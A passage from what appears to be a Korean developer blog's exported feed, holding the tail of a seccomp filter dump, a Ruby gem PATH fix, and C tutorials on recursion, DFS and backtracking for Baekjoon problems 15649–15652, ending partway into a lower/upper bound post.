0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Related Challenge</p><ul><li><a href="https://jiravvit.github.io/221005-d-ctf2022-destruction/">https://jiravvit.github.io/221005-d-ctf2022-destruction/</a></li><li><a href="https://jiravvit.github.io/230207-dicectf2023-bop/">https://jiravvit.github.io/230207-dicectf2023-bop/</a></li></ul><h2 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING:  You don&#x27;t have /home/jir4vvit/.local/share/gem/ruby/3.0.0/bin in your PATH,</span><br><span class="line">          gem executables will not run.</span><br></pre></td></tr></table></figure><p>If you get warning as above when you use the <code>gem</code>, you execute the command below.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GEM_HOME=<span class="string">&quot;<span class="subst">$(ruby -e &#x27;puts Gem.user_dir&#x27;)</span>&quot;</span> </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:<span class="variable">$GEM_HOME</span>/bin&quot;</span></span><br><span class="line">gem list</span><br><span class="line">gem update</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Recursion, DFS, Backtracking (Baekjoon 15649, 15650, 15651, 15652 C)</title>
      <link href="/230202-algorithm-dfs_backtracking/"/>
      <url>/230202-algorithm-dfs_backtracking/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li><a href="https://solved.ac/en/profile/cutieee">https://solved.ac/en/profile/cutieee</a></li></ul><p>요즘 C로 백준을 꾸준히 풀고 있다. 이 글을 시점으로 Streak 54 days를 달성했다. 짝짝짝! 어제쯤 실버 2를 달성했는데 요즘 들어 알고리즘을 따로 공부해야할 필요성을 느낀다. 그냥 풀게 되면 시간 초과가 나기 일수. 혹은 문제 풀이 방향성을 잡기가 힘들다.</p><p>백준 15649, 15650, 15651, 15652 문제를 풀면서 재귀, DFS, 백트래킹 개념을 다질 수 있었다. 백준 사이트에서 <a href="https://www.acmicpc.net/step/34">단계별로 풀어보기</a>에서 백트래킹 입문 문제를 스스로 풀이하였다. 문제를 풀이하면서 얻은 지식을 블로그에 정리해놓으려고 한다.</p><p>이 글의 목표는 백트래킹을 이해하고 백준 15649, 15650, 15651, 15652 문제를 푸는 것이다.</p><h2 id="Recursion-재귀"><a href="#Recursion-재귀" class="headerlink" title="Recursion 재귀"></a>Recursion 재귀</h2><p>재귀 함수를 아래와 같이 표현할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> func(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p><code>func</code> 함수는 n+1을 인자로 자기 자신을 다시 호출한다. n이 5일 때 출력하지 않고 종료한다. </p><p>재귀 함수는 주로 가독성을 위해 쓰여진다. (이론적으로 재귀함수는 for문과 while문 등으로 표현할 수 있다.) 재귀 함수에 대한 이해가 어려운 이유는 재귀 함수를 일반 함수와 다르게 생각하기 때문이다. 사실 흔히 아는 일반 함수와 같다고 생각하면 이게 무엇인지는 바로 이해가 될 것이다.</p><h2 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h2><p>DFS(Depth - First - Search)는 깊이 우선 탐색을 의미한다. 어떠한 내용을 브루트 포싱할 때 제일 깊이 내려가서 아래단부터 탐색하는 것을 의미한다. 아래 gif를 보면 잘 이해가 될 것이다. </p><img src="/images/230202-algorithm-dfs_backtracking/Depth-First-Search.gif" width=350/><br>DFS는 주로 그래프나 트리와 연관되어 사용된다고 한다. 코드는 아래 백트래킹 설명에서 한꺼번에 살펴보자.<p>DFS는 조건 상관없이 모든 것을 탐색해야 한다. <code>백준 15649 N과 M (1)</code> 보다 <code>백준 15651 N과 M (3)</code> 부터 풀이를 진행하는 것이 백트래킹 이해에 더 도움이 될 듯 하다. (스포지만 (3)은 백트래킹 개념 없이 DFS만을 가지고 풀이할 수 있다.)</p><ul><li><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></li></ul><h2 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h2><p>위의 DFS에서 봤던 트리를 잠깐 상상해보자. 정답을 찾기위해 부모 노드에서 자식 노드까지 내려간다. 이때 어떠한 조건에 부합하는 경우만 자식 노드로 내려가고 그렇지 않다면 다시 부모 노드로 올라간다. 이러한 <code>조건에 부합한다.</code>를 <strong><code>유망하다.</code></strong> 라고 표현한다. 조건에 부합하지 않은, 즉 유망하지 않은 노드는 확인을 안하기 때문에 풀이 시간을 단축할 수 있다. </p><p>트리로 예시를 들었지만 사실 구현은 큐나 재귀함수로 많이 한다고 한다. 이 글에선 재귀함수로 문제를 풀이하도록 한다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (정답이라면) &#123;</span><br><span class="line">        정답 출력 후 종료</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//정답이 아니라면</span></span><br><span class="line">        <span class="keyword">for</span> (모든 자식 노드에 대해서) &#123;</span><br><span class="line">            <span class="keyword">if</span> (정답에 유망하다면) &#123;</span><br><span class="line">                자식 노드로 이동</span><br><span class="line">                DFS(depth + <span class="number">1</span>);</span><br><span class="line">                부모 노드로 이동</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>재귀 함수 밑에 나오는 문장은 어떻게 이해해야 할까?<br>정답에 유망하다면 자식 노드를 일단 선택한 뒤에, 그걸 선택한 후 해결한 뒤에, 다시 원래의 상태로 되돌린다.(부모 노드로 이동) </p><h2 id="백준-15649-N과-M-1"><a href="#백준-15649-N과-M-1" class="headerlink" title="백준 15649 N과 M (1)"></a>백준 15649 N과 M (1)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15649">https://www.acmicpc.net/problem/15649</a></p></li><li><p>1부터 N까지 자연수 중에서 <strong>중복 없이</strong> M개를 고른 수열. 한 마디로 <code>nPm</code>을 구하는 문제.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br></pre></td></tr></table></figure></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span>) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>중복을 위해 사용한 <code>visit</code> 배열은 <code>값</code>이 사용했나 안했나를 판단하는 배열이다. (<code>값</code>을 인덱스로 활용한다.) 입력이 1부터 시작하기 때문에 <code>visit</code> 배열 인덱스를 1부터 사용한다. 지금 생각해보면 check의 네이밍이 좀 더 어울리는 것 같기도 하다. 가독성을 위하여 bool 타입으로 지정하였다. false라면 사용을 하지 않았기 때문에 <code>data</code> 배열에 값을 넣어주고 해당 값을 인덱스로 가지는 <code>visit</code> 배열을 true로 세팅한다. 그리고 그 다음 자식 노드를 탐색한다. </p><p>만약 유망하지 않다면 <code>i++</code>로 다음 반복문을 돈다. </p><p>depth가 m과 같을 경우엔 트리 끝까지 다 내려갔기 때문에 <code>data</code> 배열이 출력된다. 잊으면 안되는 것이 m이 출력해야할 숫자 수이다. 어쩌면 이 조건은 당연한 것일지도 모른다. 헷갈리지 말자. </p><p>이 문제를 이해하면 다음 2, 3, 4는 매우 쉽게 풀이할 수 있다. 내가 그랬다.</p><h2 id="백준-15650-N과-M-2"><a href="#백준-15650-N과-M-2" class="headerlink" title="백준 15650 N과 M (2)"></a>백준 15650 N과 M (2)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15650">https://www.acmicpc.net/problem/15650</a></p></li><li><p>1부터 N까지 자연수 중에서 중복 없이 M개를 고른 수열. 추가로 <strong>오름차순</strong>이어야 함.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br></pre></td></tr></table></figure></li><li><p>이 전 문제와 다르게 오름차순이 아닌 경우면 출력을 하지 않는다.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span> &amp;&amp; pre &lt; i) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 전 코드에서 <code>pre &lt; i</code> 조건을 추가해주었다. 이때 주의해야할 점은 pre가 등장했기 때문에 main 함수에서 depth 1부터 탐색한다. 즉 data 배열을 인덱스 1부터 사용한다. 그래서 출력할 때 <code>for (int i = 1; i &lt;= m; i++)</code> 조건으로 해야한다.</p><h2 id="백준-15651-N과-M-3"><a href="#백준-15651-N과-M-3" class="headerlink" title="백준 15651 N과 M (3)"></a>백준 15651 N과 M (3)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></p></li><li><p>1부터 N까지 자연수 중에서 M개를 고른 수열. <strong>중복 허용</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p><code>N과 M (1)</code> 문제와 비교해서 중복이 허용되었다. 사실상 이 문제가 구현하기 가장 쉬울 것 같다.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            data[depth] = i;</span><br><span class="line">            DFS(depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>조건 없이 모든 것을 다 완전히 탐색하기 때문에 백트래킹 알고리즘은 사용되지 않았다. DFS로 완전탐색한다.</p><h2 id="백준-15652-N과-M-4"><a href="#백준-15652-N과-M-4" class="headerlink" title="백준 15652 N과 M (4)"></a>백준 15652 N과 M (4)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15652">https://www.acmicpc.net/problem/15652</a></p></li><li><p>1부터 N까지 자연수 중에서 M개를 고른 수열. 중복 허용. <strong>비내림차순</strong></p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 1</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 2</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 3</span><br><span class="line">3 4</span><br><span class="line">4 4</span><br></pre></td></tr></table></figure></li><li><p>길이가 K인 수열 A가 A1 ≤ A2 ≤ … ≤ AK-1 ≤ AK를 만족하면, 비내림차순이라고 한다.</p></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> pre)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m+<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pre &lt;= i) &#123; <span class="comment">// 비내림차순</span></span><br><span class="line">                data[depth] = i;</span><br><span class="line">                DFS(depth+<span class="number">1</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">   DFS(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>N과 M (2)에서 오름차순을 구현했다면 쉽게 유망한 조건에 비내림차순을 구현할 수 있다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://moz1e.tistory.com/15">https://moz1e.tistory.com/15</a> </li><li><a href="https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98">https://velog.io/@newon-seoul/%EB%AC%B8%EA%B3%BC%EC%83%9D%EC%9D%B4-%EC%A0%81%EC%96%B4%EB%B3%B4%EB%8A%94-%EB%B0%B1%ED%8A%B8%EB%9E%98%ED%82%B9-%EC%9E%AC%EA%B7%80%EC%99%80-DFS-%EB%A5%BC-%EA%B3%81%EB%93%A4%EC%9D%B8#%E2%91%A1-dfs-%ED%95%A8%EC%88%98</a></li><li><a href="https://www.acmicpc.net/board/view/53440">https://www.acmicpc.net/board/view/53440</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> Recursion </tag>
            
            <tag> DFS </tag>
            
            <tag> Backtracking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Lower bound, Upper bound (Baekjoon 10816, C)</title>
      <link href="/230201-algorithm-upper_lower/"/>
      <url>/230201-algorithm-upper_lower/</url>
      
        <content type="html"><![CDATA[<ul><li><p><a href="https://jiravvit.github.io/230123-alrorithm-binsearch/">https://jiravvit.github.io/230123-alrorithm-binsearch/</a> </p></li><li><p>위의 Binary Search에서 파생됨, 따라서 Lower Bound, Upper Bound 알고리즘은 정렬된 배열에 대해 사용이 가능함</p></li><li><p><strong>Binary Search</strong>: 원하는 값 key를 찾는 과정</p></li><li><p><strong>Lower bound</strong>: 원하는 값 key 이상이 처음 나오는 위치를 찾는 과정</p></li><li><p><strong>Upper bound</strong>: 원하는 값 key를 초과한 값이 처음 나오는 위치를 찾는 과정</p></li><li><p>Binary Search는 원하는 값 key가 아니면 보통 -1을 반환함.(이 전 게시글 구현에서는 0을 반환했음.) 하지만 Lower bound와 Upper bound는 어떻게든 적절한 위치를 반환함.</p></li></ul><h2 id="Lower-Bound"><a href="#Lower-Bound" class="headerlink" title="Lower Bound"></a>Lower Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>원하는 값 key 이상이면 key도 포함이다. 중복되는 key 중에서 가장 작은 인덱스를 가져온다. Binary search 코드에서 조금만 변형시켜주면 된다. </p><h2 id="Upper-Bound"><a href="#Upper-Bound" class="headerlink" title="Upper Bound"></a>Upper Bound</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 